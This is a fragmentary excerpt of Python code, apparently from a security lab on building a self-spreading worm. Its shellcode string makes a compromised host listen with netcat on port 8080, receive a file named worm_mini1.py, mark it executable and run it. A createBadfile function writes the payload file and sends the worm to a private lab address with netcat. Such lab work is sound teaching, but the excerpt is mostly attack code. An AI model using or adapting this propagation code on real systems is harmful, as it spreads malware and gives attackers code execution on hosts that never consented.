...
shellcode= (
   ...
   " nc -lnv 8080 > worm_mini1.py; chmod +x worm_mini1.py;      " #as per the approach 2, we are adding the pilot code here
   " python3 worm_mini1.py                                     *"
...
def createBadfile():
   ...
   with open('badfile', 'wb') as f:
      f.write(content)
   subprocess.run(["nc -w5 10.151.0.71 8080 < worm_mini1.py"], shell=True) #adding the subprocess here with -w5 option as stated in server/ 										client details
